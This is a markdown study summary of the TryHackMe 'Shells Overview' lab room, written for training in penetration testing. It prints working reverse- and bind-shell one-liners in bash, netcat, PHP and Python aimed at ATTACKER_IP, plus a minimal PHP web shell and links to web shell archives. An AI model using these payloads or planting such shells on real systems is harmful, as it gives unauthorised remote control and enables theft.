# 🐚 TryHackMe - Shells Overview (Highly Detailed Summary)

This markdown provides a comprehensive guide to the **Shells Overview** TryHackMe room. Shells are essential in cybersecurity, allowing attackers and pentesters to execute commands on compromised systems. This guide breaks down shell types, usage, payloads, listeners, and practical exploitation.

---

## 🧠 Task 1 - Room Introduction


![Shells Overview](https://github.com/user-attachments/assets/d1c7593c-8ee3-41c1-b238-0bb84b6372f9)


Shells are command-line interfaces used to interact with operating systems. In offensive security, shells are used to:

- Remotely control target machines
- Perform privilege escalation
- Exfiltrate sensitive data
- Maintain persistence
- Move laterally in a network (pivoting)

### 🎯 Learning Objectives:
- Understand different types of shells in cybersecurity
- Manually create and operate reverse, bind, and web shells
- Analyze listener tools (Netcat, Socat, Ncat, etc.)
- Practice using real shell payloads in Bash, PHP, Python, and more

---

## 🧾 Task 2 - What is a Shell?


![Terminal Shell Icon](https://github.com/user-attachments/assets/c019ea95-2602-45ec-b260-50286a840968)


A shell is an interface between users and the OS. In offensive security, it's used by attackers to:

| Objective | Description |
|-----------|-------------|
| Remote Control | Execute commands remotely |
| Privilege Escalation | Elevate from limited to admin/root |
| Data Exfiltration | Copy/transfer sensitive files |
| Persistence | Add backdoors or new user accounts |
| Post-Exploitation | Spread malware, tamper logs |
| Pivoting | Access other internal systems via the shell |

---

## 🔁 Task 3 - Reverse Shells

A **reverse shell** initiates a connection from **target → attacker**, bypassing inbound firewall restrictions.

### 🧰 Set up Listener (Attacker)
```bash
nc -lvnp 443
```

### 💣 Reverse Shell Payload:
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

### 🔍 Breakdown:
- `mkfifo`: Named pipe for bi-directional communication
- `nc`: Connects back to attacker
- `sh -i`: Interactive shell
- `2>&1`: Redirects stderr to stdout

---

## 🔗 Task 4 - Bind Shells

A **bind shell** opens a listening port on the **victim machine**, and the attacker connects to it.

### 🧰 On the Target (Victim)
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

### 🧰 On the Attacker
```bash
nc -nv TARGET_IP 8080
```

> Bind shells require the victim to be reachable, and are less stealthy.

---

## 🎧 Task 5 - Shell Listeners

### 🧰 Netcat (Basic)
```bash
nc -lvnp 443
```

### 🧰 rlwrap + nc (With history, arrow keys)
```bash
rlwrap nc -lvnp 443
```

### 🧰 Ncat (SSL support)
```bash
ncat --ssl -lvnp 443
```

### 🧰 Socat (Advanced socket control)
```bash
socat -d -d TCP-LISTEN:443 STDOUT
```

---

## 💥 Task 6 - Shell Payloads

### 🐚 Bash Reverse Shells:
```bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
```

### 📜 PHP Reverse Shells:
```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
```

### 🐍 Python Reverse Shells:
```bash
python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```

### 🧪 Other Shell Types:
| Language | Command |
|----------|---------|
| Telnet   | `telnet ATTACKER_IP 443` |
| BusyBox  | `busybox nc ATTACKER_IP 443 -e sh` |
| AWK      | TCP socket loop execution via awk |
| File Descriptors | `/dev/tcp/` access via descriptors 196, 5, etc. |

---

## 🌍 Task 7 - Web Shells


### 🖼️ Web Shell Interfaces (Examples)

Below are screenshots of common PHP web shells in action:

#### 🐚 p0wny-shell
![p0wny-shell Screenshot](https://github.com/user-attachments/assets/5286219f-85be-4dce-aa28-cdb43a0e92d8)

#### 🕷️ b374k-shell
![b374k-shell Screenshot](https://github.com/user-attachments/assets/54c5f419-e209-44d8-911c-2d849402db0d)

#### 💀 c99-shell
![c99-shell Screenshot](https://github.com/user-attachments/assets/f99683a3-82f7-4a07-8b6a-b28460c36775)


Web shells are scripts uploaded to vulnerable web servers. They allow attackers to run commands through a browser.

### 📄 PHP Web Shell Example:
```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

### 🔗 Usage:
```http
http://victim.com/shell.php?cmd=whoami
```

### 🧰 Popular Web Shells:
- [p0wny-shell](https://github.com/flozz/p0wny-shell)
- [b374k](https://github.com/b374k/b374k)
- [c99](https://github.com/tennc/webshell)

> More at: [r57shell.net](https://www.r57shell.net/index.php)

---

## 🧪 Task 8 - Practical Exercise

### Start Machine
Access the shell challenge via:

- `http://MACHINE_IP:8080`: Static landing page
- `http://MACHINE_IP:8081`: Command Injection vuln
- `http://MACHINE_IP:8082`: File Upload vuln

Goal: Get the flag in `THM{}` format.

---

## ✅ Task 9 - Conclusion

### 📌 Recap of Shell Types:
| Type | Description | Direction |
|------|-------------|-----------|
| Reverse | Victim connects to attacker | Outbound |
| Bind | Attacker connects to victim | Inbound |
| Web | Executed through HTTP requests | Browser-based |

### 🎯 Key Takeaways:
- Shells = Entry point for further exploitation
- Manual shells increase understanding of how remote access works
- Detecting shells helps in defensive cybersecurity

---

## 📚 References

- [TryHackMe Shells Overview](https://tryhackme.com/room/shellsoverview)
- [PayloadsAllTheThings - Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [GTFOBins - Local shell escapes](https://gtfobins.github.io/)
- [Web Shells Archive](https://www.r57shell.net)
